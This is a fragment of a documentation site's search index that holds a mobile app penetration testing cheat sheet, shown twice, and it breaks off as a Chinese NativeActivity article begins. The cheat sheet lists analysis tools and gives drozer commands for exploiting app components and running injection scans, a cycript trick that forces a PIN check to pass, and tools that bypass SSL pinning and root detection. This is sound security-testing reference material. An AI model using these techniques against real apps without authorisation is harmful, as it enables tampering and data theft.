and Malware Analysis Mobisec \u2013 Mobile security testing live environment. Santo k u \u2013 Santoku is an OS and can be run outside a VM as a standalone operating system. Vezir Project \u2013 Mobile Application Pentesting and Malware Analysis Environment. All-in-One Mobile Security Frameworks Mobile Security Framework \u2013 MobSF \u2013 Mobile Security Framework is an intelligent, all-in-one open source mobile application (Android/iOS) automated pen-testing framework capable of performing static and dynamic analysis. python manage.py runserver 127.0.0.1:1337 Needle \u2013 Needle is an open source, modular framework to streamline the process of conducting security assessments of iOS apps including Binary Analysis, Static Code Analysis, Runtime Manipulation using Cycript and Frida hooking, and so on. Objection \u2013 Objection is a runtime mobile exploration toolkit, powered by Frida. It was built with the aim of helping assess mobile applications and their security posture without the need for a jailbroken or rooted mobile device. Android Application Penetration Testing Reverse Engineering and Static Analysis APKInspector \u2013 APKinspector is a powerful GUI tool for analysts to analyze the Android applications. APKTool \u2013 A tool for reverse engineering 3rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications. Disassembling Android apk file apktool d <apk file> Rebuilding decoded resources back to binary APK/JAR with certificate signing apktool b <modified folder> keytool -genkey -v -keystore keys/test.keystore -alias Test -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000 jarsigner -keystore keys/test.keystore dist/test.apk -sigalg SHA1withRSA -digestalg SHA1 Test Sign \u2013 Sign.jar automatically signs an apk with the Android test certificate. Jadx \u2013 Dex to Java decompiler: Command line and GUI tools for produce Java source code from Android Dex and Apk files. Oat2dex \u2013 A tool for converting .oat file to .dex files. Deoptimize boot classes (The output will be in \u201codex\u201d and \u201cdex\u201d folders) java -jar oat2dex.jar boot <boot.oat file> Deoptimize application java -jar oat2dex.jar <app.odex> </app. Get odex from oat java -jar oat2dex.jar odex <oat file> Get odex smali (with optimized opcode) from oat/odex java -jar oat2dex.jar smali <oat/odex file> FindBugs + FindSecurityBugs \u2013 FindSecurityBugs is a extension for FindBugs which include security rules for Java applications. Qark \u2013 This tool is designed to look for several security related Android application vulnerabilities, either in source code or packaged APKs. SUPER \u2013 SUPER is a command-line application that can be used in Windows, MacOS X and Linux, that analyzes .apk files in search for vulnerabilities. It does this by decompressing APKs and applying a series of rules to detect those vulnerabilities. AndroBugs \u2013 AndroBugs Framework is an efficient Android vulnerability scanner that helps developers or hackers find potential security vulnerabilities in Android applications. No need to install on Windows. Simplify \u2013 A tool for de-obfuscating android package into Classes.dex which can be use Dex2jar and JD-GUI to extract contents of dex file. simplify.jar -i \"input smali files or folder\" -o ClassNameDeobfuscator \u2013 Simple script to parse through the .smali files produced by apktool and extract the .source annotation lines. Android backup extractor \u2013 Utility to extract and repack Android backups created with adb backup (ICS+). Largely based on BackupManagerService.java from AOSP. Tip !! \u201cadb backup\u201d command can also be used for extracting application package with the following command: adb backup <package name> dd if=backup.ab bs=1 skip=24 | python -c \"import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))\" > backup.tar Dynamic and Runtime Analysis Cydia Substrate \u2013 Cydia Substrate for Android enables developers to make changes to existing software with Substrate extensions that are injected in to the target process\u2019s memory. Xposed Framework \u2013 Xposed framework enables you to modify the system or application aspect and behaviour at runtime, without modifying any Android application package(APK) or re-flashing. logcat-color \u2013 A colorful and highly configurable alternative to the adb logcat command from the Android SDK. Inspeckage \u2013 Inspeckage is a tool developed to offer dynamic analysis of Android applications. By applying hooks to functions of the Android API, Inspeckage will help you understand what an Android application is doing at runtime. Frida \u2013 The toolkit works using a client-server model and lets you inject in to running processes not just on Android, but also on iOS, Windows and Mac. Diff-GUI \u2013 A Web framework to start instrumenting with the avaliable modules, hooking on native, inject JavaScript using Frida. AndBug \u2013 AndBug is a debugger targeting the Android platform\u2019s Dalvik virtual machine intended for reverse engineers and developers. Identifying application process using adb shell adb shell ps | grep -i \"App keyword\" Accessing the application using AndBug in order to identify loaded classes andbug shell -p Tracing specific class ct <package name> Debugging with jdb adb forward tcp:<port> jdwp:<port> jdb -attach localhost: Cydia Substrate: Introspy-Android \u2013 Blackbox tool to help understand what an Android application is doing at runtime and assist in the identification of potential security issues. Drozer \u2013 Drozer allows you to search for security vulnerabilities in apps and devices by assuming the role of an app and interacting with the Dalvik VM, other apps\u2019 IPC endpoints and the underlying OS. Starting a session adb forward tcp:31415 tcp:31415 drozer console connect Retrieving package information run app.package.list -f <app name> run app.package.info -a <package name> Identifying the attack surface run app.package.attacksurface <package name> Exploiting Activities run app.activity.info -a <package name> -u run app.activity.start --component <component name> Exploiting Content Provider run app.provider.info -a <package name> run scanner.provider.finduris -a <package name> run app.provider.query <uri> run app.provider.update <uri> --selection <conditions> <selection arg> <column> <data> run scanner.provider.sqltables -a <package name> run scanner.provider.injection -a <package name> run scanner.provider.traversal -a <package name> Exploiting Broadcast Receivers run app.broadcast.info -a <package name> run app.broadcast.send --component <component name> --extra run app.broadcast.sniff --action <action> Exploiting Service run app.service.info -a <package name> run app.service.start --action <action> --component <package name> <component name> run app.service.send <package name> <component name> --msg <what> <arg1> <arg2> --extra <type> <key> <value> --bundle-as-obj Network Analysis and Server Side Testing Tcpdump \u2013 A command line packet capture utility. Wireshark \u2013 An open-source packet analyzer. Live packet captures in real time adb shell \"tcpdump -s 0 -w - | nc -l -p 4444\" adb forward tcp:4444 tcp:4444 nc localhost 4444 | sudo wireshark -k -S -i \u2013 Canape \u2013 A network testing tool for arbitrary protocols. Mallory \u2013 A Man in The Middle Tool (MiTM) that use to monitor and manipulate traffic on mobile devices and applications. Burp Suite \u2013 Burp Suite is an integrated platform for performing security testing of applications. OWASP ZAP \u2013 OWASP Zed Attack Proxy Project is an open-source web application security scanner. It is intended to be used by both those new to application security as well as professional penetration testers. Proxydroid \u2013 Global Proxy App for Android System. Bypassing Root Detection and SSL Pinning Xposed Module: Just Trust Me \u2013 Xposed Module to bypass SSL certificate pinning. Xposed Module: SSLUnpinning \u2013 Android Xposed Module to bypass SSL certificate validation (Certificate Pinning). Cydia Substrate Module: Android SSL Trust Killer \u2013 Blackbox tool to bypass SSL certificate pinning for most applications running on a device. Cydia Substrate Module: RootCoak Plus \u2013 Patch root checking for commonly known indications of root. Android-ssl-bypass \u2013 an Android debugging tool that can be used for bypassing SSL, even when certificate pinning is implemented, as well as other debugging tasks. The tool runs as an interactive console. Security Libraries PublicKey Pinning \u2013 Pinning in Android can be accomplished through a custom X509TrustManager. X509TrustManager should perform the customary X509 checks in addition to performing the pinning configuration. Android Pinning \u2013 A standalone library project for certificate pinning on Android. Java AES Crypto \u2013 A simple Android class for encrypting & decrypting strings, aiming to avoid the classic mistakes that most such classes suffer from. Proguard \u2013 ProGuard is a free Java class file shrinker, optimizer, obfuscator, and preverifier. It detects and removes unused classes, fields, methods, and attributes. SQL Cipher \u2013 SQLCipher is an open source extension to SQLite that provides transparent 256-bit AES encryption of database files. Secure Preferences \u2013 Android Shared preference wrapper than encrypts the keys and values of Shared Preferences. Trusted Intents \u2013 Library for flexible trusted interactions between Android apps. iOS Application Penetration Testing Access Filesystem on iDevice FileZilla \u2013 It supports FTP, SFTP, and FTPS (FTP over SSL/TLS). Cyberduck \u2013 Libre FTP, SFTP, WebDAV, S3, Azure & OpenStack Swift browser for Mac and Windows. itunnel \u2013 Use to forward SSH via USB. iProxy \u2013 Let\u2019s you connect your laptop to the iPhone to surf the web. iFunbox \u2013 The File and App Management Tool for iPhone, iPad & iPod Touch. Reverse Engineering and Static Analysis otool \u2013 The otool command displays specified parts of object files or libraries. Clutch \u2013 Decrypted the application and dump specified bundleID into binary or .ipa file. Dumpdecrypted \u2013 Dumps decrypted mach-o files from encrypted iPhone applications from memory to disk. This tool is necessary for security researchers to be able to look under the hood of encryption. `iPod:~ root# DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Applications/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/Scan.app/Scan * [class-dump](http://stevenygard.com/projects/class-dump/) \u2013 A command-line utility for examining the Objective-C runtime information stored in Mach-O files. * [Weak Classdump](https://github.com/limneos/weak_classdump) \u2013 A Cycript script that generates a header file for the class passed to the function. Most useful when you cannot classdump or dumpdecrypted , when binaries are encrypted etc. + iPod:~ root# cycript -p Skype weak_classdump.cy; cycript -p Skype + #cy weak_classdump_bundle([NSBundle mainBundle],\"/tmp/Skype\")` * IDA Pro \u2013 IDA is a Windows, Linux or Mac OS X hosted multi-processor disassembler and debugger that offers so many features it is hard to describe them all. * HopperApp \u2013 Hopper is a reverse engineering tool for OS X and Linux, that lets you disassemble, decompile and debug your 32/64bits Intel Mac, Linux, Windows and iOS executables. * hopperscripts \u2013 Hopperscripts can be used to demangle the Swift function name in HopperApp. * Radare2 \u2013 Radare2 is a unix-like reverse engineering framework and commandline tools. * iRET \u2013 The iOS Reverse Engineering Toolkit is a toolkit designed to automate many of the common tasks associated with iOS penetration testing. Dynamic and Runtime Analysis cycript \u2013 Cycript allows developers to explore and modify running applications on either iOS or Mac OS X using a hybrid of Objective-C++ and JavaScript syntax through an interactive console that features syntax highlighting and tab completion. Show currently visible view controller cy# UIApp.keyWindow.rootViewController.visibleViewController Show view controller at the top of the navigation stack cy# UIApp.keyWindow.rootViewController.topViewController Get an array of existing objects of a certain class cy# choose(UIViewController) List method at runtime cy# classname.messages or `cy# function printMethods(className, isa) { var count = new new Type(\"I\"); var classObj = (isa != undefined) ? objc_getClass(className)->isa : objc_getClass(className); var methods = class_copyMethodList(classObj, count); var methodsArray = []; for(var i = 0; i < *count; i++) { var method = methods[i]; methodsArray.push({selector:method_getName(method), implementation:method_getImplementation(method)}); } free(methods); return methodsArray; } - cy# printMethods(\" \") + Prints out all the instance variables - cy# a=#0x15d0db80 - cy# a or - cy# function tryPrintIvars(a){ var x={}; for(i in a){ try{ x[i] = (*a)[i]; } catch(e){} } return x; } - cy# a=#0x15d0db80 - cy# tryPrintIvars(a) + Manipulating through property - cy# [a pinCode] - cy# [a setPinCode: @\"1234\"] or cy# a.setPinCode= @\"1234\" + Method Swizzling - cy# [a isValidPin] - cy# .prototype.isValidPin = function(){return 1;}` * Frida-cycript \u2013 This is a fork of Cycript in which we replaced its runtime with a brand new runtime called Mj\u00f8lner powered by Frida. This enables frida-cycript to run on all the platforms and architectures maintained by frida-core. * Fridpa \u2013 An automated wrapper script for patching iOS applications (IPA files) and work on non-jailbroken device. * iNalyzer \u2013 AppSec Labs iNalyzer is a framework for manipulating iOS applications, tampering with parameters and method. * Passionfruit \u2013 Simple iOS app blackbox assessment tool with Fully web based GUI. Powered by frida.re and vuejs. * idb \u2013 idb is a tool to simplify some common tasks for iOS pentesting and research. * snoop-it \u2013 A tool to assist security assessments and dynamic analysis of iOS Apps. * Introspy-iOS \u2013 Blackbox tool to help understand what an iOS application is doing at runtime and assist in the identification of potential security issues. * gdb \u2013 A tool to perform runtime analysis of IOS applications. * keychaindumper \u2013 A tool to check which keychain items are available to an attacker once an iOS device has been jailbroken. * BinaryCookieReader \u2013 A tool to dump all the cookies from the binary Cookies.binarycookies file. Network Analysis and Server Side Testing Canape \u2013 A network testing tool for arbitrary protocols. Mallory \u2013 A Man in The Middle Tool (MiTM) that use to monitor and manipulate traffic on mobile devices and applications. Burp Suite \u2013 Burp Suite is an integrated platform for performing security testing of applications. OWASP ZAP \u2013 OWASP Zed Attack Proxy Project is an open-source web application security scanner. It is intended to be used by both those new to application security as well as professional penetration testers. Charles Proxy \u2013 HTTP proxy / HTTP monitor / Reverse Proxy that enables a developer to view all of the HTTP and SSL / HTTPS traffic between their machine and the Internet. Bypassing Root Detection and SSL Pinning SSL Kill Switch 2 \u2013 Blackbox tool to disable SSL certificate validation \u2013 including certificate pinning \u2013 within iOS and OS X Apps. iOS TrustMe \u2013 Disable certificate trust checks on iOS devices. Xcon \u2013 A tool for bypassing Jailbreak detection. tsProtector \u2013 Another tool for bypassing Jailbreak detection. Security Libraries PublicKey Pinning \u2013 iOS pinning is performed through a NSURLConnectionDelegate. The delegate must implement connection:canAuthenticateAgainstProtectionSpace: and connection:didReceiveAuthenticationChallenge:. Within connection:didReceiveAuthenticationChallenge:, the delegate must call SecTrustEvaluate to perform customary X509 checks. OWASP iMAS \u2013 iMAS is a collaborative research project from the MITRE Corporation focused on open source iOS security controls. You can follow us on Linkedin , Twitter , Facebook for daily Cybersecurity updates also you can take the Best Cybersecurity courses online to keep your self-updated. Note: This Resource comes under Attribution 4.0 International Licence and it *has been shared with Appropriate Permission from Licence * \u539f\u6587\u94fe\u63a5\uff1a https://gbhackers.com/mobile-application-penetration-testing/","title":"Mobile Application Penetration Testing Cheat sheet with Tools & Resources"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#mobile-application-penetration-testing-cheat-sheet-with-tools-resources-for-security-professionals","text":"The Mobile Apps Pentesting cheat sheet was created to provide a collection of high-value information on specific mobile application penetration testing topics and checklist, which is mapped OWASP Mobile Risk Top 10 for conducting Penetration testing. Here you can find the most important Android Application Penetration Testing course to enhance more skill in this area.","title":"Mobile Application Penetration Testing Cheat sheet with Tools &amp; Resources for Security Professionals"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#mobile-application-security-testing-distributions","text":"Appie \u2013 A portable software package for Android Pentesting and an awesome alternative to existing Virtual machines. Android Tamer \u2013 Android Tamer is a Virtual / Live Platform for Android Security professionals. AppUse \u2013 AppUse is a VM (Virtual Machine) developed by AppSec Labs. Androl4b \u2013 A Virtual Machine For Assessing Android applications, Reverse Engineering and Malware Analysis Mobisec \u2013 Mobile security testing live environment. Santo k u \u2013 Santoku is an OS and can be run outside a VM as a standalone operating system. Vezir Project \u2013 Mobile Application Pentesting and Malware Analysis Environment.","title":"Mobile Application Security Testing Distributions"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#all-in-one-mobile-security-frameworks","text":"Mobile Security Framework \u2013 MobSF \u2013 Mobile Security Framework is an intelligent, all-in-one open source mobile application (Android/iOS) automated pen-testing framework capable of performing static and dynamic analysis. python manage.py runserver 127.0.0.1:1337 Needle \u2013 Needle is an open source, modular framework to streamline the process of conducting security assessments of iOS apps including Binary Analysis, Static Code Analysis, Runtime Manipulation using Cycript and Frida hooking, and so on. Objection \u2013 Objection is a runtime mobile exploration toolkit, powered by Frida. It was built with the aim of helping assess mobile applications and their security posture without the need for a jailbroken or rooted mobile device.","title":"All-in-One Mobile Security Frameworks"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#android-application-penetration-testing","text":"","title":"Android Application Penetration Testing"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#reverse-engineering-and-static-analysis","text":"APKInspector \u2013 APKinspector is a powerful GUI tool for analysts to analyze the Android applications. APKTool \u2013 A tool for reverse engineering 3rd party, closed, binary Android apps. It can decode resources to nearly original form and rebuild them after making some modifications. Disassembling Android apk file apktool d <apk file> Rebuilding decoded resources back to binary APK/JAR with certificate signing apktool b <modified folder> keytool -genkey -v -keystore keys/test.keystore -alias Test -keyalg RSA -keysize 1024 -sigalg SHA1withRSA -validity 10000 jarsigner -keystore keys/test.keystore dist/test.apk -sigalg SHA1withRSA -digestalg SHA1 Test Sign \u2013 Sign.jar automatically signs an apk with the Android test certificate. Jadx \u2013 Dex to Java decompiler: Command line and GUI tools for produce Java source code from Android Dex and Apk files. Oat2dex \u2013 A tool for converting .oat file to .dex files. Deoptimize boot classes (The output will be in \u201codex\u201d and \u201cdex\u201d folders) java -jar oat2dex.jar boot <boot.oat file> Deoptimize application java -jar oat2dex.jar <app.odex> </app. Get odex from oat java -jar oat2dex.jar odex <oat file> Get odex smali (with optimized opcode) from oat/odex java -jar oat2dex.jar smali <oat/odex file> FindBugs + FindSecurityBugs \u2013 FindSecurityBugs is a extension for FindBugs which include security rules for Java applications. Qark \u2013 This tool is designed to look for several security related Android application vulnerabilities, either in source code or packaged APKs. SUPER \u2013 SUPER is a command-line application that can be used in Windows, MacOS X and Linux, that analyzes .apk files in search for vulnerabilities. It does this by decompressing APKs and applying a series of rules to detect those vulnerabilities. AndroBugs \u2013 AndroBugs Framework is an efficient Android vulnerability scanner that helps developers or hackers find potential security vulnerabilities in Android applications. No need to install on Windows. Simplify \u2013 A tool for de-obfuscating android package into Classes.dex which can be use Dex2jar and JD-GUI to extract contents of dex file. simplify.jar -i \"input smali files or folder\" -o ClassNameDeobfuscator \u2013 Simple script to parse through the .smali files produced by apktool and extract the .source annotation lines. Android backup extractor \u2013 Utility to extract and repack Android backups created with adb backup (ICS+). Largely based on BackupManagerService.java from AOSP. Tip !! \u201cadb backup\u201d command can also be used for extracting application package with the following command: adb backup <package name> dd if=backup.ab bs=1 skip=24 | python -c \"import zlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))\" > backup.tar","title":"Reverse Engineering and Static Analysis"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#dynamic-and-runtime-analysis","text":"Cydia Substrate \u2013 Cydia Substrate for Android enables developers to make changes to existing software with Substrate extensions that are injected in to the target process\u2019s memory. Xposed Framework \u2013 Xposed framework enables you to modify the system or application aspect and behaviour at runtime, without modifying any Android application package(APK) or re-flashing. logcat-color \u2013 A colorful and highly configurable alternative to the adb logcat command from the Android SDK. Inspeckage \u2013 Inspeckage is a tool developed to offer dynamic analysis of Android applications. By applying hooks to functions of the Android API, Inspeckage will help you understand what an Android application is doing at runtime. Frida \u2013 The toolkit works using a client-server model and lets you inject in to running processes not just on Android, but also on iOS, Windows and Mac. Diff-GUI \u2013 A Web framework to start instrumenting with the avaliable modules, hooking on native, inject JavaScript using Frida. AndBug \u2013 AndBug is a debugger targeting the Android platform\u2019s Dalvik virtual machine intended for reverse engineers and developers. Identifying application process using adb shell adb shell ps | grep -i \"App keyword\" Accessing the application using AndBug in order to identify loaded classes andbug shell -p Tracing specific class ct <package name> Debugging with jdb adb forward tcp:<port> jdwp:<port> jdb -attach localhost: Cydia Substrate: Introspy-Android \u2013 Blackbox tool to help understand what an Android application is doing at runtime and assist in the identification of potential security issues. Drozer \u2013 Drozer allows you to search for security vulnerabilities in apps and devices by assuming the role of an app and interacting with the Dalvik VM, other apps\u2019 IPC endpoints and the underlying OS. Starting a session adb forward tcp:31415 tcp:31415 drozer console connect Retrieving package information run app.package.list -f <app name> run app.package.info -a <package name> Identifying the attack surface run app.package.attacksurface <package name> Exploiting Activities run app.activity.info -a <package name> -u run app.activity.start --component <component name> Exploiting Content Provider run app.provider.info -a <package name> run scanner.provider.finduris -a <package name> run app.provider.query <uri> run app.provider.update <uri> --selection <conditions> <selection arg> <column> <data> run scanner.provider.sqltables -a <package name> run scanner.provider.injection -a <package name> run scanner.provider.traversal -a <package name> Exploiting Broadcast Receivers run app.broadcast.info -a <package name> run app.broadcast.send --component <component name> --extra run app.broadcast.sniff --action <action> Exploiting Service run app.service.info -a <package name> run app.service.start --action <action> --component <package name> <component name> run app.service.send <package name> <component name> --msg <what> <arg1> <arg2> --extra <type> <key> <value> --bundle-as-obj","title":"Dynamic and Runtime Analysis"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#network-analysis-and-server-side-testing","text":"Tcpdump \u2013 A command line packet capture utility. Wireshark \u2013 An open-source packet analyzer. Live packet captures in real time adb shell \"tcpdump -s 0 -w - | nc -l -p 4444\" adb forward tcp:4444 tcp:4444 nc localhost 4444 | sudo wireshark -k -S -i \u2013 Canape \u2013 A network testing tool for arbitrary protocols. Mallory \u2013 A Man in The Middle Tool (MiTM) that use to monitor and manipulate traffic on mobile devices and applications. Burp Suite \u2013 Burp Suite is an integrated platform for performing security testing of applications. OWASP ZAP \u2013 OWASP Zed Attack Proxy Project is an open-source web application security scanner. It is intended to be used by both those new to application security as well as professional penetration testers. Proxydroid \u2013 Global Proxy App for Android System.","title":"Network Analysis and Server Side Testing"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#bypassing-root-detection-and-ssl-pinning","text":"Xposed Module: Just Trust Me \u2013 Xposed Module to bypass SSL certificate pinning. Xposed Module: SSLUnpinning \u2013 Android Xposed Module to bypass SSL certificate validation (Certificate Pinning). Cydia Substrate Module: Android SSL Trust Killer \u2013 Blackbox tool to bypass SSL certificate pinning for most applications running on a device. Cydia Substrate Module: RootCoak Plus \u2013 Patch root checking for commonly known indications of root. Android-ssl-bypass \u2013 an Android debugging tool that can be used for bypassing SSL, even when certificate pinning is implemented, as well as other debugging tasks. The tool runs as an interactive console.","title":"Bypassing Root Detection and SSL Pinning"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#security-libraries","text":"PublicKey Pinning \u2013 Pinning in Android can be accomplished through a custom X509TrustManager. X509TrustManager should perform the customary X509 checks in addition to performing the pinning configuration. Android Pinning \u2013 A standalone library project for certificate pinning on Android. Java AES Crypto \u2013 A simple Android class for encrypting & decrypting strings, aiming to avoid the classic mistakes that most such classes suffer from. Proguard \u2013 ProGuard is a free Java class file shrinker, optimizer, obfuscator, and preverifier. It detects and removes unused classes, fields, methods, and attributes. SQL Cipher \u2013 SQLCipher is an open source extension to SQLite that provides transparent 256-bit AES encryption of database files. Secure Preferences \u2013 Android Shared preference wrapper than encrypts the keys and values of Shared Preferences. Trusted Intents \u2013 Library for flexible trusted interactions between Android apps.","title":"Security Libraries"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#ios-application-penetration-testing","text":"","title":"iOS Application Penetration Testing"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#access-filesystem-on-idevice","text":"FileZilla \u2013 It supports FTP, SFTP, and FTPS (FTP over SSL/TLS). Cyberduck \u2013 Libre FTP, SFTP, WebDAV, S3, Azure & OpenStack Swift browser for Mac and Windows. itunnel \u2013 Use to forward SSH via USB. iProxy \u2013 Let\u2019s you connect your laptop to the iPhone to surf the web. iFunbox \u2013 The File and App Management Tool for iPhone, iPad & iPod Touch.","title":"Access Filesystem on iDevice"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#reverse-engineering-and-static-analysis_1","text":"otool \u2013 The otool command displays specified parts of object files or libraries. Clutch \u2013 Decrypted the application and dump specified bundleID into binary or .ipa file. Dumpdecrypted \u2013 Dumps decrypted mach-o files from encrypted iPhone applications from memory to disk. This tool is necessary for security researchers to be able to look under the hood of encryption. `iPod:~ root# DYLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/mobile/Applications/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx/Scan.app/Scan * [class-dump](http://stevenygard.com/projects/class-dump/) \u2013 A command-line utility for examining the Objective-C runtime information stored in Mach-O files. * [Weak Classdump](https://github.com/limneos/weak_classdump) \u2013 A Cycript script that generates a header file for the class passed to the function. Most useful when you cannot classdump or dumpdecrypted , when binaries are encrypted etc. + iPod:~ root# cycript -p Skype weak_classdump.cy; cycript -p Skype + #cy weak_classdump_bundle([NSBundle mainBundle],\"/tmp/Skype\")` * IDA Pro \u2013 IDA is a Windows, Linux or Mac OS X hosted multi-processor disassembler and debugger that offers so many features it is hard to describe them all. * HopperApp \u2013 Hopper is a reverse engineering tool for OS X and Linux, that lets you disassemble, decompile and debug your 32/64bits Intel Mac, Linux, Windows and iOS executables. * hopperscripts \u2013 Hopperscripts can be used to demangle the Swift function name in HopperApp. * Radare2 \u2013 Radare2 is a unix-like reverse engineering framework and commandline tools. * iRET \u2013 The iOS Reverse Engineering Toolkit is a toolkit designed to automate many of the common tasks associated with iOS penetration testing.","title":"Reverse Engineering and Static Analysis"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#dynamic-and-runtime-analysis_1","text":"cycript \u2013 Cycript allows developers to explore and modify running applications on either iOS or Mac OS X using a hybrid of Objective-C++ and JavaScript syntax through an interactive console that features syntax highlighting and tab completion. Show currently visible view controller cy# UIApp.keyWindow.rootViewController.visibleViewController Show view controller at the top of the navigation stack cy# UIApp.keyWindow.rootViewController.topViewController Get an array of existing objects of a certain class cy# choose(UIViewController) List method at runtime cy# classname.messages or `cy# function printMethods(className, isa) { var count = new new Type(\"I\"); var classObj = (isa != undefined) ? objc_getClass(className)->isa : objc_getClass(className); var methods = class_copyMethodList(classObj, count); var methodsArray = []; for(var i = 0; i < *count; i++) { var method = methods[i]; methodsArray.push({selector:method_getName(method), implementation:method_getImplementation(method)}); } free(methods); return methodsArray; } - cy# printMethods(\" \") + Prints out all the instance variables - cy# a=#0x15d0db80 - cy# a or - cy# function tryPrintIvars(a){ var x={}; for(i in a){ try{ x[i] = (*a)[i]; } catch(e){} } return x; } - cy# a=#0x15d0db80 - cy# tryPrintIvars(a) + Manipulating through property - cy# [a pinCode] - cy# [a setPinCode: @\"1234\"] or cy# a.setPinCode= @\"1234\" + Method Swizzling - cy# [a isValidPin] - cy# .prototype.isValidPin = function(){return 1;}` * Frida-cycript \u2013 This is a fork of Cycript in which we replaced its runtime with a brand new runtime called Mj\u00f8lner powered by Frida. This enables frida-cycript to run on all the platforms and architectures maintained by frida-core. * Fridpa \u2013 An automated wrapper script for patching iOS applications (IPA files) and work on non-jailbroken device. * iNalyzer \u2013 AppSec Labs iNalyzer is a framework for manipulating iOS applications, tampering with parameters and method. * Passionfruit \u2013 Simple iOS app blackbox assessment tool with Fully web based GUI. Powered by frida.re and vuejs. * idb \u2013 idb is a tool to simplify some common tasks for iOS pentesting and research. * snoop-it \u2013 A tool to assist security assessments and dynamic analysis of iOS Apps. * Introspy-iOS \u2013 Blackbox tool to help understand what an iOS application is doing at runtime and assist in the identification of potential security issues. * gdb \u2013 A tool to perform runtime analysis of IOS applications. * keychaindumper \u2013 A tool to check which keychain items are available to an attacker once an iOS device has been jailbroken. * BinaryCookieReader \u2013 A tool to dump all the cookies from the binary Cookies.binarycookies file.","title":"Dynamic and Runtime Analysis"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#network-analysis-and-server-side-testing_1","text":"Canape \u2013 A network testing tool for arbitrary protocols. Mallory \u2013 A Man in The Middle Tool (MiTM) that use to monitor and manipulate traffic on mobile devices and applications. Burp Suite \u2013 Burp Suite is an integrated platform for performing security testing of applications. OWASP ZAP \u2013 OWASP Zed Attack Proxy Project is an open-source web application security scanner. It is intended to be used by both those new to application security as well as professional penetration testers. Charles Proxy \u2013 HTTP proxy / HTTP monitor / Reverse Proxy that enables a developer to view all of the HTTP and SSL / HTTPS traffic between their machine and the Internet.","title":"Network Analysis and Server Side Testing"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#bypassing-root-detection-and-ssl-pinning_1","text":"SSL Kill Switch 2 \u2013 Blackbox tool to disable SSL certificate validation \u2013 including certificate pinning \u2013 within iOS and OS X Apps. iOS TrustMe \u2013 Disable certificate trust checks on iOS devices. Xcon \u2013 A tool for bypassing Jailbreak detection. tsProtector \u2013 Another tool for bypassing Jailbreak detection.","title":"Bypassing Root Detection and SSL Pinning"},{"location":"Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/#security-libraries_1","text":"PublicKey Pinning \u2013 iOS pinning is performed through a NSURLConnectionDelegate. The delegate must implement connection:canAuthenticateAgainstProtectionSpace: and connection:didReceiveAuthenticationChallenge:. Within connection:didReceiveAuthenticationChallenge:, the delegate must call SecTrustEvaluate to perform customary X509 checks. OWASP iMAS \u2013 iMAS is a collaborative research project from the MITRE Corporation focused on open source iOS security controls. You can follow us on Linkedin , Twitter , Facebook for daily Cybersecurity updates also you can take the Best Cybersecurity courses online to keep your self-updated. Note: This Resource comes under Attribution 4.0 International Licence and it *has been shared with Appropriate Permission from Licence * \u539f\u6587\u94fe\u63a5\uff1a https://gbhackers.com/mobile-application-penetration-testing/","title":"Security Libraries"},{"location":"Android/NativeActivity%E5%8E%9F%E7%90%86/","text":"\u5199android\u7eafc++\u7684\u7a0b\u5e8f\u9700\u8981\u7528\u5230NativeActivity\uff0c\u8fd9\u4e2aNativeActivity\u5c31\u662f\u4e00\u4e2a\u4e00\u822c\u7684java\u7c7b\uff0c\u548c\u666e\u901a\u7684activity\u6ca1\u6709\u533a\u522b\u3002 NativeActivity \u662fandroid sdk\u81ea\u5e26\u7684\u4e00\u4e2aactivity\u3002android\u7684\u7eafc++\u7684\u7a0b\u5e8f\u4e5f\u662f\u9700\u8981\u4e00\u4e2ajava\u865a\u62df\u673a\u6765\u8fd0\u884c\u7684\u3002nativeActivity\u901a\u8fc7native_app_glu\u6765\u542f\u52a8\u6211\u4eec\u7684c++\u7ebf\u7a0b\uff0c\u4f20\u9012\u5404\u79cdactivity\u4e8b\u4ef6\u7ed9\u6211\u7684c++\u4ee3\u7801\u3002native_app_glu\u5728ndk\u7684sources\\android\u76ee\u5f55\u91cc\u9762\uff0c\u5c06native_app_glu\u5f53\u505a\u6211\u4eec\u5de5\u7a0b\u7684\u9759\u6001\u5e93\uff0c\u8fd9\u4e2a\u9759\u6001\u5e93\u91cc\u9762\u5c01\u88c5\u597d\u4e86\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a\u7ebf\u7a0b\uff0c\u8fd9\u4e2a\u7ebf\u7a0b\u91cc\u9762\u4f1a\u8c03\u7528\u4e00\u4e2aandroid_main(android_app* 